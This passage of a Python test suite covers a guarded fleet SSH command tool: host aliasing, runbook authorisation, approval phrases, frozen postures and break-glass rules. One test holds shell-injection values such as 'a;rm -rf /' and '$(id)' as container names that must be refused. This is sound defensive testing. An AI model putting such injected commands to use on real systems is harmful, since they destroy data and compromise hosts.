        self.assertEqual(self.cmds(), [])


# ===========================================================================
# host sets
# ===========================================================================

class ResolveHostsTest(_Harness):
    GROUPS = {"web": ["web1", "web3"], "dns": ["dns1", "dns2"]}
    GOV = dict((h, {"posture": "test"})
               for h in ("edge1", "web3", "web1", "web2", "dns1", "dns2"))

    def _r(self, spec, machines=None, gov=None):
        return vpsexec.resolve_hosts(spec, self.GROUPS, gov or self.GOV,
                                     machines=machines)

    def test_single_and_comma_list_preserve_order(self):
        self.assertEqual(self._r("edge1")["hosts"], ["edge1"])
        self.assertEqual(self._r("web3,edge1,web1")["hosts"], ["web3", "edge1", "web1"])

    def test_group_and_all(self):
        self.assertEqual(self._r("@web")["hosts"], ["web1", "web3"])
        self.assertEqual(self._r("@all")["hosts"], sorted(self.GOV))

    def test_groups_and_hosts_mix(self):
        self.assertEqual(self._r("@dns,edge1")["hosts"], ["dns1", "dns2", "edge1"])

    def test_unknown_group_refused_and_lists_what_exists(self):
        with self.assertRaises(Refused) as cm:
            self._r("@nope")
        self.assertIn("dns", str(cm.exception))
        self.assertIn("web", str(cm.exception))

    def test_unknown_host_refused(self):
        with self.assertRaises(Refused) as cm:
            self._r("not-a-fleet-host")
        self.assertIn("~/.ssh/config", str(cm.exception))

    def test_two_ssh_aliases_for_one_machine_run_once_and_report_the_drop(self):
        """Running twice on one box is the fleet version of the
        one-character-volume mistake."""
        machines = {"192.0.2.10": {"aliases": ["web1", "web2"]}}
        r = self._r("web1,web2", machines=machines)
        self.assertEqual(r["hosts"], ["web1"])
        self.assertEqual(r["dropped"], [("web2", "web1")])

    def test_repeated_host_collapses(self):
        self.assertEqual(self._r("edge1,edge1,edge1")["hosts"], ["edge1"])

    def test_empty_spec_refused(self):
        for bad in ("", "   ", ","):
            with self.assertRaises(Refused, msg=bad):
                self._r(bad)


class GovernorAliasTest(_Harness):
    """`web1` IS `web1.example.internal`. One machine, one canonical name."""

    ALIASES = ("edge1", "web3", "web2", "dns1", "dns2", "web1.example.internal")
    GROUPS = {"primary": ["web1"], "web": ["web1", "web3"]}

    def _r(self, spec):
        return vpsexec.resolve_hosts(spec, self.GROUPS,
                                     _policy_aliased()["hosts"])

    def test_short_name_is_rewritten_to_the_reachable_one(self):
        r = self._r("web1")
        self.assertEqual(r["hosts"], ["web1.example.internal"])
        self.assertEqual(r["aliased"], [("web1", "web1.example.internal")])

    def test_naming_both_names_runs_once(self):
        r = self._r("web1,web1.example.internal")
        self.assertEqual(r["hosts"], ["web1.example.internal"])

    def test_group_may_use_the_short_name(self):
        self.assertEqual(self._r("@primary")["hosts"], ["web1.example.internal"])

    def test_all_lists_the_machine_once_and_excludes_nothing(self):
        r = self._r("@all")
        self.assertIn("web1.example.internal", r["hosts"])
        self.assertNotIn("web1", r["hosts"])
        self.assertEqual(r["excluded"], [])

    def test_posture_is_read_from_the_canonical_host(self):
        """The laundering test: reaching the frozen box by its short name must
        not produce a different answer."""
        gov = _policy_aliased()
        with self.assertRaises(Refused) as cm:
            vpsexec.dispatch(["web1", "./deploy.sh", "--run", "--reason", "x"],
                             guard=_guard(gov),
                             policy=_yaml_policy(groups=self.GROUPS),
                             prober=self.prober(), ssh=self.fake_ssh(),
                             stream=ApprovalTest._NoTTY())
        self.assertIn("posture", str(cm.exception))
        self.assertIn("web1.example.internal(frozen)", str(cm.exception))
        self.assertEqual(self.ssh_calls, [])

    def test_alias_with_a_different_posture_is_refused_at_load(self):
        """An alias that could carry its own posture would BE the laundering
        hole. The governor must refuse to load at all."""
        gov = _policy_aliased()
        gov["hosts"]["web1"]["posture"] = "released"   # laundering attempt
        with self.assertRaises(Refused) as cm:
            _guard(gov)
        self.assertIn("two postures", str(cm.exception))

    def test_alias_chains_and_dangling_targets_refused(self):
        gov = _policy_aliased()
        gov["hosts"]["shortest"] = {"posture": "frozen", "alias_of": "web1"}
        with self.assertRaises(Refused) as cm:
            _guard(gov)
        self.assertIn("itself an alias", str(cm.exception))

        gov = _policy_aliased()
        gov["hosts"]["ghost"] = {"posture": "frozen", "alias_of": "nowhere"}
        with self.assertRaises(Refused) as cm:
            _guard(gov)
        self.assertIn("not a governed host", str(cm.exception))

    def test_ssh_calls_use_the_canonical_name(self):
        rc = vpsexec.dispatch(
            ["web1", "docker ps"], guard=_guard(_policy_aliased()),
            policy=_yaml_policy(groups=self.GROUPS), prober=self.prober(),
            ssh=self.fake_ssh(), stream=ApprovalTest._NoTTY())
        self.assertEqual(rc, 0)
        self.assertEqual(self.ssh_calls, [("web1.example.internal", "docker ps")])


class RunbookAliasTest(_Harness):
    """A runbook names a MACHINE. Target resolution rewrites `web1` to
    `web1.example.internal`, so an authorisation naming either spelling must
    match either invocation — and must still never match another host.
    Regression: every runbook naming `web1` was silently unusable."""

    ALIASES = ("edge1", "web3", "web2", "dns1", "dns2", "web1.example.internal")
    GROUPS = {"web": ["web1", "web3"]}
    CMD = "systemctl restart nginx"

    def _run(self, argv, runbooks=None, gov=None, prompt=None, override=None,
             policy=None, today="2026-08-27"):
        if override:
            argv = argv + ["--override", override]
        return vpsexec.dispatch(
            argv, guard=_guard(gov or _policy_aliased()), prober=self.prober(),
            policy=policy or _yaml_policy(groups=self.GROUPS,
                                          runbooks=runbooks or []),
            ssh=self.fake_ssh(),
            stream=ApprovalTest._TTY() if prompt else ApprovalTest._NoTTY(),
            prompt=prompt, today=today,
            blackout_runner=self.blackout_runner(unavailable=True))

    def _bg(self, spec, runbooks, n=1):
        return self._run([spec, self.CMD, "--break-glass", "--run", "--reason",
                          "OPS-1"], runbooks=runbooks,
                         prompt=lambda m: "BREAK-GLASS:%d" % n)

    def _ran_on(self):
        return [h for h, c in self.ssh_calls if "systemctl" in c]

    def test_alias_runbook_matches_alias_invocation(self):
        rb = [_runbook(["web1"], self.CMD, break_glass=True)]
        self.assertEqual(self._bg("web1", rb), 0)
        self.assertEqual(self._ran_on(), ["web1.example.internal"])

    def test_alias_runbook_matches_canonical_invocation(self):
        rb = [_runbook(["web1"], self.CMD, break_glass=True)]
        self.assertEqual(self._bg("web1.example.internal", rb), 0)
        self.assertEqual(self._ran_on(), ["web1.example.internal"])

    def test_canonical_runbook_matches_alias_invocation(self):
        rb = [_runbook(["web1.example.internal"], self.CMD, break_glass=True)]
        self.assertEqual(self._bg("web1", rb), 0)
        self.assertEqual(self._ran_on(), ["web1.example.internal"])

    def test_group_containing_an_alias(self):
        rb = [_runbook(["web1", "web3"], self.CMD, break_glass=True)]
        self.assertEqual(self._bg("@web", rb, n=2), 0)
        self.assertEqual(self._ran_on(), ["web1.example.internal", "web3"])

    def test_runbook_for_another_host_does_not_match(self):
        """Canonicalisation joins the two names of ONE machine, nothing else."""
        for other in ("web3", "web2", "web1.example", "web"):
            self.ssh_calls = []
            rb = [_runbook([other], self.CMD, break_glass=True)]
            with self.assertRaises(Refused) as cm:
                self._bg("web1", rb)
            self.assertIn("web1.example.internal", str(cm.exception))
            self.assertEqual(self.ssh_calls, [], other)

    def test_permits_is_exact_across_aliases(self):
        aliases = vpsexec.governor_aliases(_policy_aliased()["hosts"])
        entries = [_runbook(["web1"], self.CMD)]
        for host in ("web1", "web1.example.internal"):
            self.assertIsNotNone(vpsexec.permits(entries, host, self.CMD,
                                                 "host", aliases=aliases))
        for host in ("web3", "web2", "edge1"):
            self.assertIsNone(vpsexec.permits(entries, host, self.CMD,
                                              "host", aliases=aliases))
        self.assertIsNone(vpsexec.permits(
            [_runbook(["web3"], self.CMD)], "web1.example.internal",
            self.CMD, "host", aliases=aliases))

    def test_missing_names_both_spellings(self):
        with self.assertRaises(Refused) as cm:
            self._bg("web1", [_runbook(["web1"], self.CMD, break_glass=False)])
        self.assertIn("Missing for: web1.example.internal (alias: web1)",
                      str(cm.exception))
        self.assertEqual(self.ssh_calls, [])

    @unittest.skipUnless(vpsexec._HAVE_YAML, "PyYAML unavailable")
    def test_override_file_naming_an_alias_matches(self):
        gov = _policy_aliased()
        gov["hosts"]["edge1.example.internal"] = {"posture": "test",
                                                "alias_of": "edge1"}
        ov = _write('version: 1\nexpires: "2999-01-01"\nreason: "r"\n'
                    'allow:\n  - hosts: [edge1.example.internal]\n'
                    '    cmd: "%s"\n    why: "w"\n' % self.CMD)
        rc = self._run(["edge1", self.CMD, "--run", "--reason", "x"], gov=gov,
                       override=ov, prompt=lambda m: "edge1")
        self.assertEqual(rc, 0)
        self.assertEqual(self._ran_on(), ["edge1"])
        # ...and the same override does not authorise a different host.
        self.ssh_calls = []
        with self.assertRaises(Refused) as cm:
            self._run(["web3", self.CMD, "--run", "--reason", "x"], gov=gov,
                      override=ov, prompt=lambda m: "web3")
        self.assertIn("not authorised", str(cm.exception))
        self.assertEqual(self.ssh_calls, [])


# ===========================================================================
# authorisations
# ===========================================================================

@unittest.skipUnless(vpsexec._HAVE_YAML, "PyYAML unavailable")
class OverrideFileTest(unittest.TestCase):
    GOOD = '''
version: 1
expires: "2999-01-01"
reason: "n8n upgrade window OPS-1421"
allow:
  - hosts: [edge1, web3]
    cmd: "systemctl restart shop-frontend"
    where: host
    why: "config reload after contract sync"
'''

    def _load(self, body=None):
        return vpsexec.load_override(_write(body or self.GOOD), DENY,
                                     today="2026-08-27")

    def test_permits_each_named_host(self):
        entries = vpsexec.authorizations(None, self._load())
        for host in ("edge1", "web3"):
            self.assertIsNotNone(vpsexec.permits(
                entries, host, "systemctl restart shop-frontend", "host"), host)

    def test_does_not_permit_an_unnamed_host(self):
        entries = vpsexec.authorizations(None, self._load())
        self.assertIsNone(vpsexec.permits(
            entries, "web1", "systemctl restart shop-frontend", "host"))

    def test_match_is_exact_not_prefix(self):
        entries = vpsexec.authorizations(None, self._load())
        for near in ("systemctl restart shop-frontend --now",
                     "systemctl restart shop-front",
                     "sudo systemctl restart shop-frontend"):
            self.assertIsNone(vpsexec.permits(entries, "edge1", near, "host"), near)

    def test_placement_is_load_bearing(self):
        entries = vpsexec.authorizations(None, self._load())
        self.assertIsNone(vpsexec.permits(
            entries, "edge1", "systemctl restart shop-frontend", "container"))

    def test_whitespace_normalised_before_matching(self):
        entries = vpsexec.authorizations(None, self._load())
        self.assertIsNotNone(vpsexec.permits(
            entries, "edge1", "systemctl  restart\tshop-frontend", "host"))

    def test_single_host_key_still_supported(self):
        body = self.GOOD.replace("hosts: [edge1, web3]", "host: edge1")
        entries = vpsexec.authorizations(None, self._load(body))
        self.assertIsNotNone(vpsexec.permits(
            entries, "edge1", "systemctl restart shop-frontend", "host"))

    def test_missing_expiry_and_expired_refused(self):
        with self.assertRaises(Refused):
            self._load(self.GOOD.replace('expires: "2999-01-01"\n', ""))
        with self.assertRaises(Refused):
            self._load(self.GOOD.replace("2999-01-01", "2020-01-01"))

    def test_missing_why_or_bad_where_refused(self):
        with self.assertRaises(Refused):
            self._load(self.GOOD.replace('    why: "config reload after contract sync"\n', ""))
        with self.assertRaises(Refused):
            self._load(self.GOOD.replace("where: host", "where: everywhere"))

    def test_entry_naming_a_floor_pattern_rejects_the_whole_file(self):
        body = self.GOOD.replace("systemctl restart shop-frontend",
                                 "docker volume prune")
        with self.assertRaises(Refused) as cm:
            self._load(body)
        self.assertIn("tampered", str(cm.exception))

    def test_unreadable_file_fails_closed(self):
        with self.assertRaises(Refused):
            vpsexec.load_override("/nonexistent/override.yml", DENY)

    def test_adhoc_override_cannot_grant_break_glass(self):
        """Elevation comes only from a runbook committed to policies/. If an
        --override file could set it, `--break-glass --override=/tmp/x.yml`
        would be ad-hoc elevation with no prior review at all."""
        body = self.GOOD.replace("    where: host\n",
                                 "    where: host\n    break_glass: true\n")
        with self.assertRaises(Refused) as cm:
            self._load(body)
        self.assertIn("committed to policies/", str(cm.exception))


@unittest.skipUnless(vpsexec._HAVE_YAML, "PyYAML unavailable")
class AdHocOverrideCannotElevateTest(_Harness):
    def test_break_glass_with_only_an_override_file_refuses(self):
        path = _write("""
version: 1
expires: "2999-01-01"
reason: "improvised"
allow:
  - hosts: [web1]
    cmd: "systemctl restart nginx"
    where: host
    why: "it is 3am and I am sure"
""")
        with self.assertRaises(Refused) as cm:
            vpsexec.dispatch(["web1", "systemctl restart nginx", "--break-glass",
                              "--run", "--reason", "x", "--override=" + path],
                             guard=_guard(), policy=_yaml_policy(),
                             prober=self.prober(), ssh=self.fake_ssh(),
                             stream=ApprovalTest._TTY(),
                             prompt=lambda m: "BREAK-GLASS:1", today="2026-08-27")
        self.assertIn("break_glass runbook", str(cm.exception))
        self.assertEqual(self.ssh_calls, [])


# ===========================================================================
# targets, plan, approval
# ===========================================================================

class TargetResolutionTest(_Harness):
    def test_no_flags_means_the_host_itself(self):
        self.assertEqual(
            vpsexec.resolve_targets("edge1", [], None, False, prober=self.prober()), [])

    def test_named_container_must_be_live(self):
        with self.assertRaises(Refused) as cm:
            vpsexec.resolve_targets("edge1", ["ghost"], None, False, prober=self.prober())
        self.assertIn("no live container", str(cm.exception))

    def test_near_miss_container_name_is_refused_by_name(self):
        with self.assertRaises(Refused) as cm:
            vpsexec.resolve_targets("edge1", ["shop-frontnd"], None, False,
                                    prober=self.prober())
        self.assertIn("one character away", str(cm.exception))
        self.assertIn("shop-frontend", str(cm.exception))

    def test_glob_matching_nothing_is_refused(self):
        with self.assertRaises(Refused) as cm:
            vpsexec.resolve_targets("edge1", [], "nope-*", False, prober=self.prober())
        self.assertIn("matched no live container", str(cm.exception))

    def test_glob_and_all(self):
        self.assertEqual(
            vpsexec.resolve_targets("edge1", [], "shop-*", False, prober=self.prober()),
            ["shop-api", "shop-frontend"])
        self.assertEqual(
            vpsexec.resolve_targets("edge1", [], None, True, prober=self.prober()),
            ["blog-web", "shop-api", "shop-frontend"])

    def test_container_command_is_quoted_not_interpolated(self):
        import shlex
        payload = "echo 'a b'; ls"
        remote = vpsexec.build_remote_command(payload, "shop-api")
        self.assertEqual(shlex.split(remote),
                         ["docker", "exec", "shop-api", "sh", "-lc", payload])

    def test_container_name_cannot_carry_shell_metacharacters(self):
        for bad in ("a;rm -rf /", "a b", "$(id)", "a|b", "-flag", ""):
            with self.assertRaises(Refused, msg=bad):
                vpsexec.resolve_targets("edge1", [bad], None, False, prober=self.prober())


class PlanHashTest(unittest.TestCase):
    def _plan(self, hosts=("edge1",), targets=None, **kw):
        base = dict(hosts=list(hosts), command="systemctl restart n8n",
                    per_host_targets=targets or {}, tier="risky",
                    detail="systemctl restart")
        base.update(kw)
        return vpsexec.build_plan(**base)

    def test_stable_for_the_same_plan(self):
        self.assertEqual(vpsexec.plan_hash(self._plan()),
                         vpsexec.plan_hash(self._plan()))

    def test_changes_when_the_fleet_changes(self):
        base = vpsexec.plan_hash(self._plan())
        self.assertNotEqual(base, vpsexec.plan_hash(self._plan(hosts=("web3",))))
        self.assertNotEqual(base, vpsexec.plan_hash(self._plan(hosts=("edge1", "web3"))))
        self.assertNotEqual(base, vpsexec.plan_hash(self._plan(command="reboot")))
        self.assertNotEqual(base, vpsexec.plan_hash(self._plan(break_glass=True)))

    def test_host_order_is_part_of_the_plan(self):
        """Serial mutations run in the order named, so the order IS the plan."""
        self.assertNotEqual(vpsexec.plan_hash(self._plan(hosts=("edge1", "web3"))),
                            vpsexec.plan_hash(self._plan(hosts=("web3", "edge1"))))

    def test_container_drift_on_any_host_invalidates_the_hash(self):
        issued = vpsexec.plan_hash(self._plan(
            hosts=("edge1", "web3"), targets={"edge1": ["a", "b"], "web3": ["c"]}))
        for drift in ({"edge1": ["a"], "web3": ["c"]},
                      {"edge1": ["a", "b"], "web3": ["c", "d"]},
                      {"edge1": ["a", "b"], "web3": []}):
            self.assertNotEqual(issued, vpsexec.plan_hash(
                self._plan(hosts=("edge1", "web3"), targets=drift)), drift)

    def test_override_digest_is_covered(self):
        base = vpsexec.plan_hash(self._plan())
        self.assertNotEqual(base, vpsexec.plan_hash(self._plan(
            override={"path": "o.yml", "sha256": "deadbeef"})))


class ApprovalTest(unittest.TestCase):
    class _NoTTY:
        def isatty(self):
            return False

    class _TTY:
        def isatty(self):
            return True

    def _plan(self, hosts=("edge1",), **kw):
        return vpsexec.build_plan(list(hosts), "systemctl restart n8n", {},
                                  "risky", "systemctl restart", **kw)

    def test_no_tty_and_no_approve_refuses(self):
        plan = self._plan()
        with self.assertRaises(Refused) as cm:
            vpsexec.approve(plan, vpsexec.plan_hash(plan), None, stream=self._NoTTY())
        self.assertIn("no TTY", str(cm.exception))

    def test_wrong_hash_refuses_and_shows_both(self):
        plan = self._plan()
        digest = vpsexec.plan_hash(plan)
        with self.assertRaises(Refused) as cm:
            vpsexec.approve(plan, digest, "f" * 64, stream=self._NoTTY())
        self.assertIn("does not match", str(cm.exception))
        self.assertIn(digest, str(cm.exception))

    def test_truncated_hash_refuses(self):
        plan = self._plan()
        digest = vpsexec.plan_hash(plan)
        with self.assertRaises(Refused):
            vpsexec.approve(plan, digest, digest[:12], stream=self._NoTTY())

    def test_matching_hash_approves_without_a_tty(self):
        plan = self._plan()
        digest = vpsexec.plan_hash(plan)
        self.assertEqual(vpsexec.approve(plan, digest, digest, stream=self._NoTTY()),
                         "plan-hash")

    def test_phrase_scales_with_what_is_at_stake(self):
        self.assertEqual(vpsexec.approval_phrase(self._plan(hosts=("edge1",))), "edge1")
        self.assertEqual(
            vpsexec.approval_phrase(self._plan(hosts=("edge1", "web3", "web1"))),
            "FLEET:3")
        self.assertEqual(
            vpsexec.approval_phrase(self._plan(hosts=("edge1", "web1"), break_glass=True)),
            "BREAK-GLASS:2")

    def test_single_host_requires_the_host_name_typed(self):
        plan = self._plan()
        digest = vpsexec.plan_hash(plan)
        self.assertEqual(
            vpsexec.approve(plan, digest, None, stream=self._TTY(),
                            prompt=lambda m: "  edge1  "), "interactive")
        for wrong in ("y", "yes", "EDGE1", "", "edge2", "edge1x", "e dge1"):
            with self.assertRaises(Refused, msg=wrong):
                vpsexec.approve(plan, digest, None, stream=self._TTY(),
                                prompt=lambda m, w=wrong: w)

    def test_fleet_and_break_glass_phrases_are_enforced(self):
        for hosts, kw, want, wrong in (
                (("edge1", "web3", "web1"), {}, "FLEET:3", "edge1"),
                (("edge1", "web1"), {"break_glass": True}, "BREAK-GLASS:2", "FLEET:2")):
            plan = self._plan(hosts=hosts, **kw)
            digest = vpsexec.plan_hash(plan)
            with self.assertRaises(Refused):
                vpsexec.approve(plan, digest, None, stream=self._TTY(),
                                prompt=lambda m: wrong)
            self.assertEqual(
                vpsexec.approve(plan, digest, None, stream=self._TTY(),
                                prompt=lambda m: want), "interactive")


# ===========================================================================
# governor
# ===========================================================================

class GovernorTest(unittest.TestCase):
    def test_frozen_and_lockdown_hosts_refuse_mutations(self):
        g = _guard()
        for host in ("web1", "web2"):
            with self.assertRaises(Refused, msg=host) as cm:
                g.assert_exec_allowed(host)
            self.assertIn("posture", str(cm.exception))

    def test_unlisted_host_defaults_to_frozen(self):
        with self.assertRaises(Refused):
            _guard().assert_exec_allowed("someone-elses-box")

    def test_test_and_released_hosts_are_allowed(self):
        g = _guard()
        g.assert_exec_allowed("edge1")
        g.assert_exec_allowed("web3")

    def test_elevated_bypasses_posture_but_nothing_else(self):
        _guard().assert_exec_elevated("web1")           # frozen, but elevated
        with self.assertRaises(Refused):
            _guard(_policy(mutation=False)).assert_exec_elevated("web1")
        with self.assertRaises(Refused):
            _guard(_policy(mode="lockdown")).assert_exec_elevated("web1")
        with self.assertRaises(Refused):
            _guard(verified=False).assert_exec_elevated("web1")

    def test_elevation_cannot_invent_a_host_the_governor_never_heard_of(self):
        with self.assertRaises(Refused) as cm:
            _guard().assert_exec_elevated("someone-elses-box")
        self.assertIn("no entry in the governor", str(cm.exception))

    def test_master_switch_and_lockdown_mode_refuse(self):
        with self.assertRaises(Refused):
            _guard(_policy(mutation=False)).assert_exec_allowed("edge1")
        with self.assertRaises(Refused):
            _guard(_policy(mode="lockdown")).assert_exec_allowed("edge1")

    def test_unverified_token_cannot_mutate(self):
        with self.assertRaises(Refused) as cm:
            _guard(verified=False).assert_exec_allowed("edge1")
        self.assertIn("control token", str(cm.exception))

    def test_exec_verb_must_be_released(self):
        with self.assertRaises(Refused):
            _guard(_policy(verbs=["show", "status"])).assert_verb("exec")


# ===========================================================================
# dispatch — end to end, transport injected
# ===========================================================================

class DispatchTest(_Harness):
    GROUPS = {"web": ["web1", "web3"], "dns": ["dns1", "dns2"], "test": ["edge1"]}

    def _run(self, argv, policy=None, gov=None, verified=True, prompt=None,
             ssh=None, names=("shop-frontend", "shop-api", "blog-web")):
        return vpsexec.dispatch(
            argv, guard=_guard(gov, verified),
            policy=policy or _yaml_policy(groups=self.GROUPS),
            prober=self.prober(names), ssh=ssh or self.fake_ssh(),
            stream=ApprovalTest._TTY() if prompt else ApprovalTest._NoTTY(),
            prompt=prompt, today="2026-08-27",
            blackout_runner=self.blackout_runner(unavailable=True))

    # --- reads: the "logs of 5 machines at once" case ---
    def test_read_runs_without_run_flag(self):
        self.assertEqual(self._run(["edge1", "df -h"]), 0)
        self.assertEqual(self.cmds(), ["df -h"])

    def test_read_fans_out_across_a_group(self):
        rc = self._run(["@dns", "journalctl -u acmednsd -n 50"])
        self.assertEqual(rc, 0)
        self.assertEqual(sorted(h for h, _ in self.ssh_calls), ["dns1", "dns2"])

    def test_read_is_allowed_on_frozen_hosts(self):
        self.assertEqual(self._run(["@web", "docker ps"]), 0)
        self.assertEqual(sorted(h for h, _ in self.ssh_calls), ["web1", "web3"])

    def test_read_across_hosts_and_containers(self):
        self._run(["edge1,web3", "df -h", "--in-match", "shop-*"])
        self.assertEqual(len(self.ssh_calls), 4)
        for _, cmd in self.ssh_calls:
            self.assertTrue(cmd.startswith("docker exec shop-"))

    def test_read_failure_on_one_host_reports_and_exits_nonzero(self):
        rc = self._run(["@dns", "df -h"], ssh=self.fake_ssh(rcs={"dns2": 1}))
        self.assertEqual(rc, 1)

    def test_unprobeable_host_refuses_the_whole_run(self):
        def bad_probe(host, what):
            if host == "web3":
                return {"host": host, "probe": what, "rc": 1,
                        "stdout": "", "stderr": "ssh: connect timeout"}
            return self.prober()(host, what)
        with self.assertRaises(Refused) as cm:
            vpsexec.dispatch(["edge1,web3", "df -h", "--in-all"],
                             guard=_guard(), policy=_yaml_policy(),
                             prober=bad_probe, ssh=self.fake_ssh(),
                             stream=ApprovalTest._NoTTY())
        self.assertIn("no plan to approve", str(cm.exception))
        self.assertEqual(self.cmds(), [])

    # --- plan-only ---
    def test_mutation_without_run_is_plan_only_and_touches_nothing(self):
        self.assertEqual(self._run(["edge1", "./deploy.sh", "--reason", "why"]), 0)
        self.assertEqual(self.ssh_calls, [])

    def test_run_without_approval_refuses_and_touches_nothing(self):
        with self.assertRaises(Refused) as cm:
            self._run(["edge1", "./deploy.sh", "--run", "--reason", "why"])
        self.assertIn("no TTY", str(cm.exception))
        self.assertEqual(self.ssh_calls, [])

    def test_mutation_requires_a_reason(self):
        with self.assertRaises(Refused) as cm:
            self._run(["edge1", "./deploy.sh", "--run"])
        self.assertIn("--reason", str(cm.exception))

    # --- posture across a fleet ---
    def test_one_frozen_host_in_the_set_refuses_the_whole_mutation(self):
        with self.assertRaises(Refused) as cm:
            self._run(["edge1,web1", "./deploy.sh", "--run", "--reason", "x"],
                      prompt=lambda m: "FLEET:2")
        self.assertIn("posture", str(cm.exception))
        self.assertIn("web1(frozen)", str(cm.exception))
        self.assertEqual(self.ssh_calls, [])

    # --- risky needs authorisation on EVERY host ---
    def test_risky_unauthorised_on_any_host_refuses(self):
        pol = _yaml_policy(groups=self.GROUPS,
                           runbooks=[_runbook(["edge1"], "systemctl restart nginx")])
        with self.assertRaises(Refused) as cm:
            self._run(["edge1,web3", "systemctl restart nginx", "--run",
                       "--reason", "x"], policy=pol, prompt=lambda m: "FLEET:2")
        self.assertIn("not authorised for 1 of 2", str(cm.exception))
        self.assertIn("web3", str(cm.exception))
        self.assertEqual(self.ssh_calls, [])

    def test_risky_authorised_everywhere_runs_serially_in_order(self):
        pol = _yaml_policy(groups=self.GROUPS,
                           runbooks=[_runbook(["edge1", "web3"],
                                              "systemctl restart nginx")])
        rc = self._run(["web3,edge1", "systemctl restart nginx", "--run",
                        "--reason", "OPS-1"], policy=pol,
                       prompt=lambda m: "FLEET:2")
        self.assertEqual(rc, 0)
        self.assertEqual([h for h, c in self.ssh_calls if "systemctl" in c],
                         ["web3", "edge1"])

    # --- fleet failure semantics: continue and report ---
    def test_fleet_mutation_continues_past_a_failure_and_exits_nonzero(self):
        pol = _yaml_policy(groups=self.GROUPS,
                           runbooks=[_runbook(["edge1", "web3"],
                                              "systemctl restart nginx")])
        rc = self._run(["web3,edge1", "systemctl restart nginx", "--run",
                        "--reason", "x"], policy=pol, prompt=lambda m: "FLEET:2",
                       ssh=self.fake_ssh(rcs={"web3": 1}))
        self.assertEqual(rc, 1)
        # web3 failed, edge1 still ran — that is the chosen semantics.
        self.assertEqual([h for h, c in self.ssh_calls if "systemctl" in c],
                         ["web3", "edge1"])
        done = [e for e in self.events() if e["event"] == "mutation_complete"][0]
        self.assertEqual(done["failed"], ["web3"])
        self.assertEqual(done["results"], {"web3": 1, "edge1": 0})

    def test_locks_taken_and_released_per_host(self):
        pol = _yaml_policy(groups=self.GROUPS,
                           runbooks=[_runbook(["edge1", "web3"],
                                              "systemctl restart nginx")])
        self._run(["web3,edge1", "systemctl restart nginx", "--run", "--reason", "x"],
                  policy=pol, prompt=lambda m: "FLEET:2")
        for host in ("web3", "edge1"):
            calls = " ".join(c for h, c in self.ssh_calls if h == host)
            self.assertIn("mkdir /run/vpscfg.lock", calls)
            self.assertIn("rmdir /run/vpscfg.lock", calls)


class BreakGlassTest(_Harness):
    """Elevation is a lookup, not an improvisation."""

    GROUPS = {"web": ["web1", "web3"]}

    def _run(self, argv, runbooks=None, gov=None, prompt=None, ssh=None):
        return vpsexec.dispatch(
            argv, guard=_guard(gov), prober=self.prober(),
            policy=_yaml_policy(groups=self.GROUPS, runbooks=runbooks or []),
            ssh=ssh or self.fake_ssh(),
            stream=ApprovalTest._TTY() if prompt else ApprovalTest._NoTTY(),
            prompt=prompt, today="2026-08-27",
            blackout_runner=self.blackout_runner(unavailable=True))

    RB = [_runbook(["web1", "web3"], "systemctl restart nginx", break_glass=True)]

    def _lapsed_policy(self):
        d = tempfile.mkdtemp()
        Path(d, "groups.yaml").write_text('version: 1\nreason: "r"\ngroups:\n  web: [web1, web3]\n')
        Path(d, "old.yaml").write_text(
            'version: 1\nreason: "r"\nexpires: "2026-08-26"\n'
            'shape: {steps: 1, hosts: [web1, web3], break_glass: true}\nrunbooks:\n'
            '  - hosts: [web1, web3]\n    cmd: "systemctl restart nginx"\n'
            '    why: "w"\n    break_glass: true\n')
        pol = vpsexecpolicy.load(d, deny_patterns=DENY, today="2026-08-27",
                                 governor_hosts=set(_policy()["hosts"]),
                                 host_re=probe.HOST_RE)
        # Lapse alone: the shape matches, so only expiry disarms it.
        self.assertEqual(pol["misshapen"], [])
        return pol

    def _dispatch(self, argv, policy, prompt=None):
        return vpsexec.dispatch(
            argv, guard=_guard(), prober=self.prober(), policy=policy,
            ssh=self.fake_ssh(),
            stream=ApprovalTest._TTY() if prompt else ApprovalTest._NoTTY(),
            prompt=prompt, today="2026-08-27",
            blackout_runner=self.blackout_runner(unavailable=True))

    def test_lapsed_policy_file_leaves_reads_working(self):
        """The outage this fixes: one lapsed file used to refuse every call."""
        rc = self._dispatch(["@web", "docker ps"], self._lapsed_policy())
        self.assertEqual(rc, 0)
        self.assertEqual(sorted(h for h, c in self.ssh_calls if c == "docker ps"),
                         ["web1", "web3"])

    def test_lapsed_runbook_no_longer_authorises_break_glass(self):
        with self.assertRaises(Refused) as cm:
            self._dispatch(["@web", "systemctl restart nginx", "--break-glass",
                            "--run", "--reason", "x"], self._lapsed_policy(),
                           prompt=lambda m: "BREAK-GLASS:2")
        # Refused at the risky gate: nothing loaded authorises it any more.
        self.assertIn("is not authorised for 2 of 2 host(s)", str(cm.exception))
        self.assertEqual([c for h, c in self.ssh_calls if "systemctl" in c], [])

    def test_runbooks_listing_shows_disarmed_files(self):
        out = vpsexec._render_runbooks(self._lapsed_policy())
        self.assertIn("no runbooks in force", out)
        self.assertIn("DISARMED (expired 2026-08-26): old.yaml, 1 runbook(s)", out)

    def _misshapen_policy(self):
        d = tempfile.mkdtemp()
        Path(d, "groups.yaml").write_text('version: 1\nreason: "r"\ngroups:\n  web: [web1, web3]\n')
        Path(d, "edited.yaml").write_text(
            'version: 1\nreason: "r"\nexpires: "2999-01-01"\n'
            'shape: {steps: 1, hosts: [web1], break_glass: true}\nrunbooks:\n'
            '  - hosts: [web1, web3]\n    cmd: "systemctl restart nginx"\n'
            '    why: "w"\n    break_glass: true\n')
        return vpsexecpolicy.load(d, deny_patterns=DENY, today="2026-08-27",
                                  governor_hosts=set(_policy()["hosts"]),
                                  host_re=probe.HOST_RE)

    def test_misshapen_runbook_no_longer_authorises_break_glass(self):
        with self.assertRaises(Refused) as cm:
            self._dispatch(["@web", "systemctl restart nginx", "--break-glass",
                            "--run", "--reason", "x"], self._misshapen_policy(),
                           prompt=lambda m: "BREAK-GLASS:2")
        self.assertIn("is not authorised for 2 of 2 host(s)", str(cm.exception))
        self.assertEqual([c for h, c in self.ssh_calls if "systemctl" in c], [])

    def test_runbooks_listing_shows_misshapen_files(self):
        out = vpsexec._render_runbooks(self._misshapen_policy())
        self.assertIn("no runbooks in force", out)
        self.assertIn("DISARMED (misshapen: hosts: declared [web1], loaded [web1, web3]):"
                      " edited.yaml, 1 runbook(s)", out)

    def test_frozen_host_without_break_glass_flag_refuses(self):
        with self.assertRaises(Refused) as cm:
            self._run(["@web", "systemctl restart nginx", "--run", "--reason", "x"],
                      runbooks=self.RB, prompt=lambda m: "BREAK-GLASS:2")
        self.assertIn("posture", str(cm.exception))
